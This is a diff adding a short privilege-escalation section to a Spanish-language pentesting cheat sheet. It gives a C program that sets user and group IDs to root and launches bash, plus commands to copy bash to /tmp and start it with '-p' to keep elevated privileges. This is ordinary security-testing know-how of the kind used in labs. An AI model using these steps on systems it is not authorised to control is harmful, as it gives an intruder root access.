@@ -66,3 +66,22 @@ base64 -d encodedfile.db.b64 > outputfile.db
 </br> Buscar varios archivos
 * `find / -type f \( -iname "*.db" -o -iname "*.sqlite" -o -iname "*.sqlite3" \) 2>/dev/null`
 
+## Escalada de Privilegios (Permisos SUID)
+* forzar los id 
+```C
+#include <unistd.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+}
+```
+* Otras acciones a realizar
+```sh
+cp /bin/bash /tmp/bash
+```
+```sh
+/bin/bash -p
+```
+* El parámetro `-p` en bash significa `preservar los privilegios efectivos` cuando se inicia la shell.
+
